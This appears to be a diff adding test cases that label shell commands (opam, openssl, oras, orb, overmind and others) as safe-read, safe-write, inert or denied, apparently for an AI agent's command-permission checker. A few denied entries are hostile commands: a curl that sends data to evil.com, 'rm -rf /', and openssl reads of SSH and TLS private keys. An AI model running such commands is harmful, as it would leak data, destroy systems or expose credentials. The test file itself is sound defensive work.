+opam env --csh --debug	safe-read
+opam env --csh --shell x	safe-read
+opam env --csh x	safe-read
+opam env --debug	safe-read
+opam env --fish	safe-read
+opam env --help	safe-read
+opam env --inplace-path	safe-read
+opam env --no-color	safe-read
+opam env --readonly	safe-read
+opam env --revert	safe-read
+opam env --safe	safe-read
+opam env --sexp	safe-read
+opam env --sh	safe-read
+opam env --shell	safe-read
+opam env --shell x	safe-read
+opam env --switch x	safe-read
+opam env --zsh	safe-read
+opam env -h	safe-read
+opam env x	safe-read
+opam exec	denied
+opam exec x	denied
+opam help	inert
+opam help x	inert
+opam info	denied
+opam info --all-versions	safe-read
+opam info --all-versions --debug	safe-read
+opam info --all-versions x	safe-read
+opam info --debug	safe-read
+opam info --depexts	safe-read
+opam info --help	safe-read
+opam info --just-file	safe-read
+opam info --list-files	safe-read
+opam info -h	safe-read
+opam info x	safe-read
+opam init	denied
+opam init x	denied
+opam install	denied
+opam install x	denied
+opam lint	safe-read
+opam lint --check-upstream	safe-read
+opam lint --check-upstream --filter x	safe-read
+opam lint --check-upstream --help	safe-read
+opam lint --check-upstream x	safe-read
+opam lint --filter x	safe-read
+opam lint --help	safe-read
+opam lint --normalize	safe-read
+opam lint --package	safe-read
+opam lint --package x	safe-read
+opam lint --short	safe-read
+opam lint --warnings x	safe-read
+opam lint -W x	safe-read
+opam lint -f x	safe-read
+opam lint -h	safe-read
+opam lint -s	safe-read
+opam lint x	safe-read
+opam list	safe-read
+opam list --all	safe-read
+opam list --all --available	safe-read
+opam list --all --field-match x	safe-read
+opam list --all x	safe-read
+opam list --available	safe-read
+opam list --columns	safe-read
+opam list --debug	safe-read
+opam list --depexts	safe-read
+opam list --depopts	safe-read
+opam list --field-match x	safe-read
+opam list --fields x	safe-read
+opam list --filter x	safe-read
+opam list --help	safe-read
+opam list --installable	safe-read
+opam list --installed	safe-read
+opam list --no-color	safe-read
+opam list --normalise	safe-read
+opam list --pinned	safe-read
+opam list --readonly	safe-read
+opam list --recursive	safe-read
+opam list --repos x	safe-read
+opam list --required-by	safe-read
+opam list --resolve	safe-read
+opam list --root	safe-read
+opam list --safe	safe-read
+opam list --search x	safe-read
+opam list --separator	safe-read
+opam list --silent	safe-read
+opam list --sort	safe-read
+opam list --switch x	safe-read
+opam list -A x	safe-read
+opam list -h	safe-read
+opam list -i x	safe-read
+opam list -s x	safe-read
+opam list x	safe-read
+opam lock	denied
+opam lock x	denied
+opam option	denied
+opam option x	denied
+opam pin	denied
+opam pin x	denied
+opam publish	denied
+opam publish x	denied
+opam remove	denied
+opam remove x	denied
+opam repository	denied
+opam repository x	denied
+opam search	denied
+opam search --case-sensitive	safe-read
+opam search --case-sensitive --debug	safe-read
+opam search --case-sensitive x	safe-read
+opam search --debug	safe-read
+opam search --help	safe-read
+opam search --installed	safe-read
+opam search --no-color	safe-read
+opam search -c	safe-read
+opam search -h	safe-read
+opam search x	safe-read
+opam show	denied
+opam show --all-versions	safe-read
+opam show --all-versions --debug	safe-read
+opam show --all-versions x	safe-read
+opam show --debug	safe-read
+opam show --depexts	safe-read
+opam show --field	safe-read
+opam show --help	safe-read
+opam show --just-file	safe-read
+opam show --list-files	safe-read
+opam show --no-color	safe-read
+opam show --normalise	safe-read
+opam show --raw	safe-read
+opam show --share	safe-read
+opam show -h	safe-read
+opam show x	safe-read
+opam source	denied
+opam source x	denied
+opam switch	denied
+opam switch x	denied
+opam tree	safe-read
+opam tree --debug	safe-read
+opam tree --debug --help	safe-read
+opam tree --debug x	safe-read
+opam tree --help	safe-read
+opam tree --no-color	safe-read
+opam tree -h	safe-read
+opam tree x	safe-read
+opam update	denied
+opam update x	denied
+opam upgrade	denied
+opam upgrade x	denied
+opam var	safe-read
+opam var --debug	safe-read
+opam var --debug --global	safe-read
+opam var --debug x	safe-read
+opam var --global	safe-read
+opam var --help	safe-read
+opam var -h	safe-read
+opam var x	safe-read
+opam version	inert
+opam version --help	inert
+opam version --help -h	inert
+opam version --help x	inert
+opam version -h	inert
+opam version x	inert
+opam x	denied
+open	safe-read
+open --arch x	safe-read
+open --env x	safe-read
+open --help	denied
+open --stderr x	safe-read
+open --stdin x	safe-read
+open --stdout x	safe-read
+open --version	denied
+open -F	safe-read
+open -F --arch x	safe-read
+open -F -R	safe-read
+open -F x	safe-read
+open -R	safe-read
+open -W	safe-read
+open -a x	safe-read
+open -b x	safe-read
+open -e	safe-read
+open -f	safe-read
+open -g	safe-read
+open -h	safe-read
+open -j	safe-read
+open -n	safe-read
+open -s x	safe-read
+open -t	safe-read
+open -u x	safe-read
+open https://example.com	safe-read
+open x	safe-read
+opencode	denied
+opencode --help	inert
+opencode --help --version	denied
+opencode --help x	denied
+opencode --version	inert
+opencode -V	inert
+opencode -h	inert
+opencode models	inert
+opencode models --help	inert
+opencode models --help -h	inert
+opencode models --help x	inert
+opencode models -h	inert
+opencode models x	inert
+opencode session	denied
+opencode session list	inert
+opencode session list --help	inert
+opencode session list --help -h	inert
+opencode session list --help x	denied
+opencode session list -h	inert
+opencode session list x	denied
+opencode session x	denied
+opencode stats	inert
+opencode stats --help	inert
+opencode stats --help -h	inert
+opencode stats --help x	denied
+opencode stats -h	inert
+opencode stats x	denied
+opencode x	denied
+openocd	denied
+openocd --help	inert
+openocd --help --version	inert
+openocd --help x	denied
+openocd --version	inert
+openocd -?	inert
+openocd -h	inert
+openocd -v	inert
+openocd x	denied
+openssl	denied
+openssl --help	inert
+openssl --help -help	denied
+openssl --help x	denied
+openssl --version	denied
+openssl -help	inert
+openssl -version	inert
+openssl asn1parse	safe-read
+openssl asn1parse --in=/root/.ssh/id_ed25519	denied
+openssl asn1parse -in=./cert.pem	safe-read
+openssl asn1parse -in=~/.ssh/id_rsa	denied
+openssl asn1parse x	safe-read
+openssl ca	safe-write
+openssl ca x	safe-write
+openssl ciphers	inert
+openssl ciphers x	inert
+openssl cms	safe-write
+openssl cms -decrypt -in m -inkey k	denied
+openssl cms x	safe-write
+openssl crl	safe-write
+openssl crl x	safe-write
+openssl crl2pkcs7	safe-write
+openssl crl2pkcs7 x	safe-write
+openssl dgst	safe-write
+openssl dgst -in=/etc/ssl/private/x.key	denied
+openssl dgst x	safe-write
+openssl dh	safe-write
+openssl dh x	safe-write
+openssl dhparam	safe-write
+openssl dhparam x	safe-write
+openssl dsa	denied
+openssl dsa x	denied
+openssl dsaparam	safe-write
+openssl dsaparam x	safe-write
+openssl ec	denied
+openssl ec x	denied
+openssl ecparam	safe-write
+openssl ecparam x	safe-write
+openssl enc	safe-write
+openssl enc -d -in x.enc -k p	denied
+openssl enc -e -in x -out x.enc -k p	safe-write
+openssl enc x	safe-write
+openssl engine	inert
+openssl engine x	inert
+openssl errstr	inert
+openssl errstr x	inert
+openssl fipsinstall	safe-write
+openssl fipsinstall x	safe-write
+openssl gendh	safe-write
+openssl gendh x	safe-write
+openssl gendsa	safe-write
+openssl gendsa x	safe-write
+openssl genpkey	safe-write
+openssl genpkey x	safe-write
+openssl genrsa	safe-write
+openssl genrsa 2048	safe-write
+openssl genrsa x	safe-write
+openssl help	inert
+openssl help x	inert
+openssl info	safe-read
+openssl info x	safe-read
+openssl kdf	safe-write
+openssl kdf x	safe-write
+openssl list	inert
+openssl list x	inert
+openssl mac	safe-write
+openssl mac x	safe-write
+openssl nseq	safe-write
+openssl nseq x	safe-write
+openssl ocsp	denied
+openssl ocsp x	denied
+openssl passwd	safe-write
+openssl passwd x	safe-write
+openssl pkcs12	safe-write
+openssl pkcs12 x	safe-write
+openssl pkcs7	safe-write
+openssl pkcs7 x	safe-write
+openssl pkcs8	denied
+openssl pkcs8 x	denied
+openssl pkey	denied
+openssl pkey -in priv.pem	denied
+openssl pkey x	denied
+openssl prime	safe-read
+openssl prime x	safe-read
+openssl rand	safe-write
+openssl rand x	safe-write
+openssl rehash	safe-write
+openssl rehash x	safe-write
+openssl req	safe-write
+openssl req x	safe-write
+openssl rsa	denied
+openssl rsa -in enc.pem -passin pass:x	denied
+openssl rsa -in priv.pem -noout -text	denied
+openssl rsa -in priv.pem -out /dev/stdout	denied
+openssl rsa -in priv.pem -pubout	safe-write
+openssl rsa x	denied
+openssl s_client	denied
+openssl s_client x	denied
+openssl s_server	denied
+openssl s_server x	denied
+openssl s_time	denied
+openssl s_time x	denied
+openssl smime	safe-write
+openssl smime -decrypt -in m.p7 -inkey k.pem	denied
+openssl smime x	safe-write
+openssl speed	denied
+openssl speed x	denied
+openssl spkac	safe-write
+openssl spkac x	safe-write
+openssl srp	denied
+openssl srp x	denied
+openssl ts	safe-write
+openssl ts x	safe-write
+openssl verify	safe-read
+openssl verify x	safe-read
+openssl version	inert
+openssl version x	inert
+openssl x	denied
+openssl x509	safe-write
+openssl x509 -in ./cert.pem -noout	safe-write
+openssl x509 -in c.pem -noout -text	safe-write
+openssl x509 x	safe-write
+opj_compress	denied
+opj_compress --help	safe-write
+opj_compress --help --version	safe-write
+opj_compress --help -F x	safe-write
+opj_compress --help x	safe-write
+opj_compress --version	safe-write
+opj_compress -EPH	safe-write
+opj_compress -F x	safe-write
+opj_compress -IMF	safe-write
+opj_compress -ImgDir x	safe-write
+opj_compress -M x	safe-write
+opj_compress -MCT	safe-write
+opj_compress -OutFor x	safe-write
+opj_compress -PLT	safe-write
+opj_compress -ROI x	safe-write
+opj_compress -SOP	safe-write
+opj_compress -TLM	safe-write
+opj_compress -TP x	safe-write
+opj_compress -V	safe-write
+opj_compress -W x	safe-write
+opj_compress -X x	safe-write
+opj_compress -b x	safe-write
+opj_compress -c x	safe-write
+opj_compress -cinema2K x	safe-write
+opj_compress -cinema4K x	safe-write
+opj_compress -d x	safe-write
+opj_compress -h	safe-write
+opj_compress -help	safe-write
+opj_compress -i x	safe-write
+opj_compress -jpip x	safe-write
+opj_compress -mct x	safe-write
+opj_compress -mode x	safe-write
+opj_compress -n x	safe-write
+opj_compress -o x	safe-write
+opj_compress -p x	safe-write
+opj_compress -poc	safe-write
+opj_compress -q x	safe-write
+opj_compress -r x	safe-write
+opj_compress -s x	safe-write
+opj_compress -t x	safe-write
+opj_compress -threads x	safe-write
+opj_compress -v	safe-write
+opj_compress -w x	safe-write
+opj_compress -z x	safe-write
+opj_compress x	safe-write
+opj_decompress	denied
+opj_decompress --help	safe-write
+opj_decompress --help --version	safe-write
+opj_decompress --help -ImgDir x	safe-write
+opj_decompress --help x	safe-write
+opj_decompress --version	safe-write
+opj_decompress -ImgDir x	safe-write
+opj_decompress -OutFor x	safe-write
+opj_decompress -V	safe-write
+opj_decompress -allow-partial	safe-write
+opj_decompress -c x	safe-write
+opj_decompress -d x	safe-write
+opj_decompress -force-rgb	safe-write
+opj_decompress -h	safe-write
+opj_decompress -help	safe-write
+opj_decompress -i x	safe-write
+opj_decompress -l x	safe-write
+opj_decompress -o x	safe-write
+opj_decompress -precision x	safe-write
+opj_decompress -quiet x	safe-write
+opj_decompress -r x	safe-write
+opj_decompress -split-pnm	safe-write
+opj_decompress -t x	safe-write
+opj_decompress -threads x	safe-write
+opj_decompress -upsample	safe-write
+opj_decompress -v	safe-write
+opj_decompress x	safe-write
+opj_dump	denied
+opj_dump --help	inert
+opj_dump --help --version	inert
+opj_dump --help -ImgDir x	inert
+opj_dump --help x	inert
+opj_dump --version	inert
+opj_dump -ImgDir x	inert
+opj_dump -V	inert
+opj_dump -f x	inert
+opj_dump -h	inert
+opj_dump -help	inert
+opj_dump -i x	inert
+opj_dump -o x	inert
+opj_dump -v	inert
+opj_dump x	inert
+opt	denied
+opt --help	safe-write
+opt --help --version	safe-write
+opt --help x	safe-write
+opt --version	safe-write
+opt -?	safe-write
+opt -h	safe-write
+opt -v	safe-write
+opt x	safe-write
+optipng	denied
+optipng --help	safe-write
+optipng --help --version	safe-write
+optipng --help -dir x	safe-write
+optipng --help x	safe-write
+optipng --version	safe-write
+optipng -clobber	safe-write
+optipng -debug	safe-write
+optipng -dir x	safe-write
+optipng -fix	safe-write
+optipng -force	safe-write
+optipng -full	safe-write
+optipng -h	safe-write
+optipng -help	safe-write
+optipng -i x	safe-write
+optipng -keep	safe-write
+optipng -log	safe-write
+optipng -log x	safe-write
+optipng -no-bit-depth-reduction	safe-write
+optipng -no-color-type-reduction	safe-write
+optipng -no-create	safe-write
+optipng -no-fix	safe-write
+optipng -no-palette-reduction	safe-write
+optipng -no-reductions	safe-write
+optipng -out x	safe-write
+optipng -paranoid	safe-write
+optipng -preserve	safe-write
+optipng -q	safe-write
+optipng -quiet	safe-write
+optipng -simulate	safe-write
+optipng -snip	safe-write
+optipng -strip	safe-write
+optipng -strip x	safe-write
+optipng -version	safe-write
+optipng -zc x	safe-write
+optipng -zm x	safe-write
+optipng -zs x	safe-write
+optipng -zw	safe-write
+optipng x	safe-write
+oras	denied
+oras --ca-file x	denied
+oras --cert-file x	denied
+oras --help	inert
+oras --help --ca-file x	denied
+oras --help --version	denied
+oras --help x	denied
+oras --key-file x	denied
+oras --output x	denied
+oras --version	inert
+oras -h	inert
+oras -o x	denied
+oras -v	inert
+oras attach	denied
+oras attach x	denied
+oras blob	denied
+oras blob delete	denied
+oras blob delete x	denied
+oras blob fetch	inert
+oras blob fetch --ca-file x	inert
+oras blob fetch --cert-file x	inert
+oras blob fetch --config x	inert
+oras blob fetch --header x	inert
+oras blob fetch --help	inert
+oras blob fetch --help --ca-file x	inert
+oras blob fetch --help --insecure	inert
+oras blob fetch --help x	inert
+oras blob fetch --insecure	inert
+oras blob fetch --key-file x	inert
+oras blob fetch --media-type x	inert
+oras blob fetch --output x	inert
+oras blob fetch --password x	inert
+oras blob fetch --plain-http	inert
+oras blob fetch --registry-config x	inert
+oras blob fetch --username x	inert
+oras blob fetch --verbose	inert
+oras blob fetch -h	inert
+oras blob fetch -o x	inert
+oras blob fetch -p x	inert
+oras blob fetch -u x	inert
+oras blob fetch -v	inert
+oras blob fetch x	inert
+oras blob push	denied
+oras blob push x	denied
+oras blob x	denied
+oras completion	denied
+oras completion --help	inert
+oras completion --help -h	inert
+oras completion --help x	inert
+oras completion -h	inert
+oras completion x	inert
+oras copy	denied
+oras copy x	denied
+oras cp	denied
+oras cp x	denied
+oras discover	denied
+oras discover --artifact-type x	safe-read
+oras discover --ca-file x	safe-read
+oras discover --cert-file x	safe-read
+oras discover --config x	safe-read
+oras discover --distribution-spec x	safe-read
+oras discover --format x	safe-read
+oras discover --header x	safe-read
+oras discover --help	safe-read
+oras discover --help --artifact-type x	safe-read
+oras discover --help --insecure	safe-read
+oras discover --help x	safe-read
+oras discover --insecure	safe-read
+oras discover --key-file x	safe-read
+oras discover --no-color	safe-read
+oras discover --no-tty	safe-read
+oras discover --output tree localhost:5000/hello:v1	safe-read
+oras discover --output x	safe-read
+oras discover --password x	safe-read
+oras discover --password-stdin x	safe-read
+oras discover --plain-http	safe-read
+oras discover --registry-config x	safe-read
+oras discover --username x	safe-read
+oras discover --verbose x	safe-read
+oras discover -c x	safe-read
+oras discover -d x	safe-read
+oras discover -h	safe-read
+oras discover -o json localhost:5000/hello:v1	safe-read
+oras discover -o x	safe-read
+oras discover -p x	safe-read
+oras discover -u x	safe-read
+oras discover -v x	safe-read
+oras discover x	safe-read
+oras help	inert
+oras help x	inert
+oras login	denied
+oras login x	denied
+oras logout	denied
+oras logout x	denied
+oras manifest	denied
+oras manifest delete	denied
+oras manifest delete x	denied
+oras manifest fetch	inert
+oras manifest fetch --ca-file x	inert
+oras manifest fetch --cert-file x	inert
+oras manifest fetch --config x	inert
+oras manifest fetch --header x	inert
+oras manifest fetch --help	inert
+oras manifest fetch --help --ca-file x	inert
+oras manifest fetch --help --insecure	inert
+oras manifest fetch --help x	inert
+oras manifest fetch --insecure	inert
+oras manifest fetch --key-file x	inert
+oras manifest fetch --media-type x	inert
+oras manifest fetch --output x	inert
+oras manifest fetch --password x	inert
+oras manifest fetch --plain-http	inert
+oras manifest fetch --platform x	inert
+oras manifest fetch --registry-config x	inert
+oras manifest fetch --username x	inert
+oras manifest fetch --verbose	inert
+oras manifest fetch -h	inert
+oras manifest fetch -o ./manifest.json localhost:5000/hello:v1	inert
+oras manifest fetch -o x	inert
+oras manifest fetch -p x	inert
+oras manifest fetch -u x	inert
+oras manifest fetch -v	inert
+oras manifest fetch x	inert
+oras manifest fetch-config	inert
+oras manifest fetch-config --ca-file x	inert
+oras manifest fetch-config --cert-file x	inert
+oras manifest fetch-config --config x	inert
+oras manifest fetch-config --header x	inert
+oras manifest fetch-config --help	inert
+oras manifest fetch-config --help --ca-file x	inert
+oras manifest fetch-config --help -h	inert
+oras manifest fetch-config --help x	inert
+oras manifest fetch-config --key-file x	inert
+oras manifest fetch-config --media-type x	inert
+oras manifest fetch-config --output x	inert
+oras manifest fetch-config --password x	inert
+oras manifest fetch-config --platform x	inert
+oras manifest fetch-config --registry-config x	inert
+oras manifest fetch-config --username x	inert
+oras manifest fetch-config -h	inert
+oras manifest fetch-config -o x	inert
+oras manifest fetch-config -p x	inert
+oras manifest fetch-config -u x	inert
+oras manifest fetch-config x	inert
+oras manifest push	denied
+oras manifest push x	denied
+oras manifest x	denied
+oras pull	denied
+oras pull x	denied
+oras push	denied
+oras push x	denied
+oras repo	inert
+oras repo ls	inert
+oras repo ls --help	inert
+oras repo ls --help --last x	inert
+oras repo ls --help -h	inert
+oras repo ls --help x	inert
+oras repo ls --last x	inert
+oras repo ls -h	inert
+oras repo ls x	inert
+oras repo tags	inert
+oras repo tags --help	inert
+oras repo tags --help --last x	inert
+oras repo tags --help -h	inert
+oras repo tags --help x	inert
+oras repo tags --last x	inert
+oras repo tags -h	inert
+oras repo tags x	inert
+oras repo x	denied
+oras resolve	denied
+oras resolve x	denied
+oras tag	denied
+oras tag x	denied
+oras version	inert
+oras version --help	inert
+oras version --help -h	inert
+oras version --help x	inert
+oras version -h	inert
+oras version x	inert
+oras x	denied
+orb	denied
+orb --help	inert
+orb --help --version	denied
+orb --help x	denied
+orb --version	inert
+orb -V	inert
+orb -h	inert
+orb config	denied
+orb config get	inert
+orb config get --help	inert
+orb config get --help -h	inert
+orb config get --help x	inert
+orb config get -h	inert
+orb config get x	inert
+orb config show	inert
+orb config show --help	inert
+orb config show --help -h	inert
+orb config show --help x	inert
+orb config show -h	inert
+orb config show x	inert
+orb config x	denied
+orb default	inert
+orb default --help	inert
+orb default --help -h	inert
+orb default --help x	denied
+orb default -h	inert
+orb default x	denied
+orb doctor	inert
+orb doctor --help	inert
+orb doctor --help -h	inert
+orb doctor --help x	denied
+orb doctor -h	inert
+orb doctor x	denied
+orb info	denied
+orb info --format x	inert
+orb info --help	inert
+orb info --help --format x	inert
+orb info --help -h	inert
+orb info --help x	inert
+orb info -f x	inert
+orb info -h	inert
+orb info x	inert
+orb list	inert
+orb list --format x	inert
+orb list --help	inert
+orb list --help --format x	inert
+orb list --help --quiet	inert
+orb list --help x	inert
+orb list --quiet	inert
+orb list --running	inert
+orb list -f x	inert
+orb list -h	inert
+orb list -q	inert
+orb list -r	inert
+orb list x	inert
+orb logs	denied
+orb logs --all	inert
+orb logs --all --help	inert
+orb logs --all x	inert
+orb logs --help	inert
+orb logs -a	inert
+orb logs -h	inert
+orb logs x	inert
+orb status	inert
+orb status --help	inert
+orb status --help -h	inert
+orb status --help x	inert
+orb status -h	inert
+orb status x	inert
+orb update	denied
+orb update --check	inert
+orb update --check --help	inert
+orb update --check x	inert
+orb update --help	inert
+orb update -h	inert
+orb update x	denied
+orb version	inert
+orb version --help	inert
+orb version --help -h	inert
+orb version --help x	inert
+orb version -h	inert
+orb version x	inert
+orb x	denied
+orbctl	denied
+orbctl --help	inert
+orbctl --help --version	denied
+orbctl --help x	denied
+orbctl --version	inert
+orbctl -V	inert
+orbctl -h	inert
+orbctl config	denied
+orbctl config get	inert
+orbctl config get --help	inert
+orbctl config get --help -h	inert
+orbctl config get --help x	inert
+orbctl config get -h	inert
+orbctl config get x	inert
+orbctl config show	inert
+orbctl config show --help	inert
+orbctl config show --help -h	inert
+orbctl config show --help x	inert
+orbctl config show -h	inert
+orbctl config show x	inert
+orbctl config x	denied
+orbctl default	inert
+orbctl default --help	inert
+orbctl default --help -h	inert
+orbctl default --help x	denied
+orbctl default -h	inert
+orbctl default x	denied
+orbctl doctor	inert
+orbctl doctor --help	inert
+orbctl doctor --help -h	inert
+orbctl doctor --help x	denied
+orbctl doctor -h	inert
+orbctl doctor x	denied
+orbctl info	denied
+orbctl info --format x	inert
+orbctl info --help	inert
+orbctl info --help --format x	inert
+orbctl info --help -h	inert
+orbctl info --help x	inert
+orbctl info -f x	inert
+orbctl info -h	inert
+orbctl info x	inert
+orbctl list	inert
+orbctl list --format x	inert
+orbctl list --help	inert
+orbctl list --help --format x	inert
+orbctl list --help --quiet	inert
+orbctl list --help x	inert
+orbctl list --quiet	inert
+orbctl list --running	inert
+orbctl list -f x	inert
+orbctl list -h	inert
+orbctl list -q	inert
+orbctl list -r	inert
+orbctl list x	inert
+orbctl logs	denied
+orbctl logs --all	inert
+orbctl logs --all --help	inert
+orbctl logs --all x	inert
+orbctl logs --help	inert
+orbctl logs -a	inert
+orbctl logs -h	inert
+orbctl logs x	inert
+orbctl status	inert
+orbctl status --help	inert
+orbctl status --help -h	inert
+orbctl status --help x	inert
+orbctl status -h	inert
+orbctl status x	inert
+orbctl update	denied
+orbctl update --check	inert
+orbctl update --check --help	inert
+orbctl update --check x	inert
+orbctl update --help	inert
+orbctl update -h	inert
+orbctl update x	denied
+orbctl version	inert
+orbctl version --help	inert
+orbctl version --help -h	inert
+orbctl version --help x	inert
+orbctl version -h	inert
+orbctl version x	inert
+orbctl x	denied
+ormolu	safe-read
+ormolu --cabal-default-extensions x	safe-read
+ormolu --cabal-extension x	safe-read
+ormolu --check-idempotence	safe-read
+ormolu --check-idempotence --cabal-default-extensions x	safe-read
+ormolu --check-idempotence --color	safe-read
+ormolu --check-idempotence x	safe-read
+ormolu --color	safe-read
+ormolu --end-column x	safe-read
+ormolu --end-line x	safe-read
+ormolu --ghc-opt x	safe-read
+ormolu --help	safe-read
+ormolu --inplace	safe-write
+ormolu --mode x	safe-read
+ormolu --no-cabal	safe-read
+ormolu --package-name x	safe-read
+ormolu --start-column x	safe-read
+ormolu --start-line x	safe-read
+ormolu --unsafe	safe-read
+ormolu --version	denied
+ormolu -c	safe-read
+ormolu -h	safe-read
+ormolu -i	safe-write
+ormolu -o x	safe-read
+ormolu x	safe-read
+osacompile	safe-write
+osacompile --help	denied
+osacompile --version	denied
+osacompile -c x	safe-write
+osacompile -d	safe-write
+osacompile -d -c x	safe-write
+osacompile -d -s	safe-write
+osacompile -d x	safe-write
+osacompile -e 'beep' -o beep.scpt	safe-write
+osacompile -e x	safe-write
+osacompile -l x	safe-write
+osacompile -o x	safe-write
+osacompile -r x	safe-write
+osacompile -s	safe-write
+osacompile -t x	safe-write
+osacompile -u	safe-write
+osacompile -x	safe-write
+osacompile x	safe-write
+osadecompile	denied
+osadecompile --help	denied
+osadecompile --version	denied
+osadecompile x	inert
+osage	denied
+osage --help	safe-write
+osage --help -?	safe-write
+osage --help -A x	safe-write
+osage --help x	safe-write
+osage --version	denied
+osage -?	safe-write
+osage -A x	safe-write
+osage -E x	safe-write
+osage -G x	safe-write
+osage -K x	safe-write
+osage -N x	safe-write
+osage -O	safe-write
+osage -P	safe-write
+osage -T x	safe-write
+osage -V	safe-write
+osage -n x	safe-write
+osage -o x	safe-write
+osage -q	safe-write
+osage -s x	safe-write
+osage -v	safe-write
+osage -x	safe-write
+osage -y	safe-write
+osage x	safe-write
+osalang	inert
+osalang --help	denied
+osalang --version	denied
+osalang -L	inert
+osalang -L -d	inert
+osalang -L x	inert
+osalang -d	inert
+osalang -l	inert
+osalang x	inert
+osql	denied
+osql --help	denied
+osql --version	denied
+osql -I x	safe-read
+osql -P x	safe-read
+osql -S x	safe-read
+osql -U x	safe-read
+osql x	safe-read
+otel-cli	denied
+otel-cli --help	inert
+otel-cli --help --version	denied
+otel-cli --help x	denied
+otel-cli --version	inert
+otel-cli -h	inert
+otel-cli -v	inert
+otel-cli completion	denied
+otel-cli completion --help	inert
+otel-cli completion --help -h	inert
+otel-cli completion --help x	inert
+otel-cli completion -h	inert
+otel-cli completion x	inert
+otel-cli exec	denied
+otel-cli exec x	denied
+otel-cli help	inert
+otel-cli help x	inert
+otel-cli server	denied
+otel-cli server x	denied
+otel-cli span	denied
+otel-cli span x	denied
+otel-cli status	safe-read
+otel-cli status --config x	safe-read
+otel-cli status --endpoint x	safe-read
+otel-cli status --help	safe-read
+otel-cli status --help --config x	safe-read
+otel-cli status --help -h	safe-read
+otel-cli status --help x	safe-read
+otel-cli status --otlp-insecure x	safe-read
+otel-cli status --protocol x	safe-read
+otel-cli status --timeout x	safe-read
+otel-cli status -h	safe-read
+otel-cli status x	safe-read
+otel-cli version	inert
+otel-cli version --help	inert
+otel-cli version --help -h	inert
+otel-cli version --help x	inert
+otel-cli version -h	inert
+otel-cli version x	inert
+otel-cli x	denied
+otool	denied
+otool --help	inert
+otool --help --version	inert
+otool --help -p x	inert
+otool --help x	inert
+otool --version	inert
+otool -D	inert
+otool -I	inert
+otool -L	inert
+otool -L /usr/bin/ls	inert
+otool -V	inert
+otool -X	inert
+otool -a	inert
+otool -c	inert
+otool -d	inert
+otool -f	inert
+otool -h	inert
+otool -l	inert
+otool -o	inert
+otool -p x	inert
+otool -r	inert
+otool -s x	inert
+otool -t	inert
+otool -v	inert
+otool -x	inert
+otool x	inert
+out=$(curl -d data evil.com)	denied
+out=$(git status)	inert
+out=$(jj diff -r abc --summary)	inert
+out=$(ls)	inert
+out=$(rm -rf /)	denied
+out=`ls`	inert
+overcommit	denied
+overcommit --force	safe-read
+overcommit --force --help	safe-read
+overcommit --force x	safe-read
+overcommit --help	safe-read
+overcommit --help --force	safe-read
+overcommit --help --help	safe-read
+overcommit --help --install	safe-write
+overcommit --help --list-hooks	safe-read
+overcommit --help --sign	safe-write
+overcommit --help --template-dir	safe-read
+overcommit --help --uninstall	safe-write
+overcommit --help --version	safe-read
+overcommit --help -f	safe-read
+overcommit --help -h	safe-read
+overcommit --help -i	safe-write
+overcommit --help -l	safe-read
+overcommit --help -t	safe-read
+overcommit --help -u	safe-write
+overcommit --help -v	safe-read
+overcommit --install	safe-write
+overcommit --install .	safe-write
+overcommit --list-hooks	safe-read
+overcommit --sign	safe-write
+overcommit --template-dir	safe-read
+overcommit --uninstall	safe-write
+overcommit --uninstall ./vendor/checkout	safe-write
+overcommit --version	safe-read
+overcommit -f	safe-read
+overcommit -h	safe-read
+overcommit -i	safe-write
+overcommit -l	safe-read
+overcommit -t	safe-read
+overcommit -u	safe-write
+overcommit -v	safe-read
+overcommit x	safe-read
+overmind	denied
+overmind --help	inert
+overmind --help --version	denied
+overmind --help x	denied
+overmind --version	inert
+overmind -h	inert
+overmind -v	inert
+overmind connect	denied
+overmind connect --control-mode	safe-write
+overmind connect --control-mode --help	safe-write
+overmind connect --control-mode --network x	safe-write
+overmind connect --control-mode x	safe-write
+overmind connect --help	safe-write
+overmind connect --network x	safe-write
+overmind connect --socket x	safe-write
+overmind connect -S x	safe-write
+overmind connect -c	safe-write
+overmind connect -h	safe-write
+overmind connect -s x	safe-write
+overmind connect x	safe-write
+overmind echo	inert
+overmind echo --help	inert
+overmind echo --help --network x	inert
+overmind echo --help -h	inert
+overmind echo --help x	denied
+overmind echo --network x	inert
+overmind echo --socket x	inert
+overmind echo -S x	inert
+overmind echo -h	inert
+overmind echo -s x	inert
+overmind echo x	denied
+overmind help	inert
+overmind help --help	inert
+overmind help --help -h	inert
+overmind help --help x	inert
+overmind help -h	inert
+overmind help x	inert
+overmind kill	safe-write
+overmind kill --help	safe-write
+overmind kill --help --network x	safe-write
+overmind kill --help -h	safe-write
+overmind kill --help x	denied
+overmind kill --network x	safe-write
+overmind kill --socket x	safe-write
+overmind kill -S x	safe-write
+overmind kill -h	safe-write
+overmind kill -s x	safe-write
+overmind kill x	denied
+overmind quit	safe-write
+overmind quit --help	safe-write
+overmind quit --help --network x	safe-write
+overmind quit --help -h	safe-write
+overmind quit --help x	denied
+overmind quit --network x	safe-write
+overmind quit --socket x	safe-write
+overmind quit -S x	safe-write
+overmind quit -h	safe-write
+overmind quit -s x	safe-write
+overmind quit x	denied
+overmind restart	safe-write
+overmind restart --help	safe-write
+overmind restart --help --network x	safe-write
+overmind restart --help -h	safe-write
+overmind restart --help x	safe-write
+overmind restart --network x	safe-write
+overmind restart --socket x	safe-write
+overmind restart -S x	safe-write
+overmind restart -h	safe-write
+overmind restart -s x	safe-write
+overmind restart x	safe-write
+overmind run	denied
+overmind run x	denied
+overmind start	safe-write
+overmind start --any-can-die	safe-write
+overmind start --any-can-die --auto-restart x	safe-write
+overmind start --any-can-die --daemonize	safe-write
+overmind start --any-can-die x	denied
+overmind start --auto-restart x	safe-write
+overmind start --can-die x	safe-write
+overmind start --colors x	safe-write
+overmind start --daemonize	safe-write
+overmind start --formation x	safe-write
+overmind start --formation-port-step x	safe-write
+overmind start --help	safe-write
+overmind start --ignored-processes x	safe-write
+overmind start --network x	safe-write
+overmind start --no-port	safe-write
+overmind start --port x	safe-write
+overmind start --port-step x	safe-write
+overmind start --processes x	safe-write
+overmind start --procfile x	safe-write
+overmind start --root x	safe-write
+overmind start --shell x	safe-write
+overmind start --show-timestamps	safe-write
+overmind start --socket x	safe-write
+overmind start --stop-signals x	safe-write
+overmind start --timeout x	safe-write
+overmind start --title x	safe-write
+overmind start --tmux-config x	safe-write
+overmind start -D	safe-write
+overmind start -F x	safe-write
+overmind start -H x	safe-write
+overmind start -N	safe-write
+overmind start -P x	safe-write
+overmind start -S x	safe-write
+overmind start -T	safe-write
+overmind start -b x	safe-write
+overmind start -c x	safe-write
+overmind start -d x	safe-write
